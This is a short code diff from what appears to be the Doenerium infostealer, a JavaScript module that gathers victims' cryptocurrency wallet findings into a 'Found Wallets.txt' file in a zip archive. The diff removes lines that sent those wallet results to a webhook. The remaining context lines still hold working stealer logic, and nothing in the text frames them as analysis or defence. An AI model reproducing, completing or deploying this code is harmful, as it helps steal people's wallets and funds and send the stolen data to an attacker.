@@ -18,14 +18,6 @@ module.exports = (client) => {
             if (description != "") {
                 client.utils.jszip.createTxt("\\Found Wallets.txt", "<================[ Network Data ]>================>\n<================[t.me/doenerium]>================>\n\n" + description)
             }
-
-            await client.utils.webhook.sendToWebhook(
-                {
-                    "embeds": [client.utils.webhook.createEmbed({
-                        "title": `💰 Wallet search | Result`,
-                        "description": `\`\`\`${description}\`\`\``,
-                    })],
-                })
         }
     };
 };
